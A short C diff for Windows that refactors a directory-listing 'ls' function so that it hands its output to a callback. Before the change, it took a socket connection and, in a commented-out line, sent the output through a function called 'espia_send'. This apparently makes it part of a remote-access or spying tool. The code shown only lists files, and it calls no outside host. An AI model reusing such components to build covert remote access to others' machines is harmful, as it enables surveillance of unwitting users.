@@ -30,7 +30,8 @@ void pwd(LPWSTR buffer, INT size_buffer) {
     }
 }
 
-void ls(SOCKET * connection) {
+/* 'ls' uses a callback function to handle file/folder output from FindNextFileW() */
+void ls(INT (*callback)(PWSTR buffer, INT size_buffer)) {
     /* Get the current working directory and append '*' at the end */
     WCHAR temp_dir[MAX_PATH + 1] = L"";
     pwd(temp_dir, sizeof(temp_dir));
@@ -59,6 +60,6 @@ void ls(SOCKET * connection) {
             swprintf(temp_dir, L"%S\t\t\t\t%ld bytes\n", file_data.cFileName, filesize.QuadPart);
         }
 
-        //espia_send(connection, temp_dir, sizeof(file_data.cFileName));
+        (*callback)(temp_dir, sizeof(file_data.cFileName));                                         // Call the callback function to handle output
     } while (FindNextFileW(file_handle, &file_data) != 0);
 }
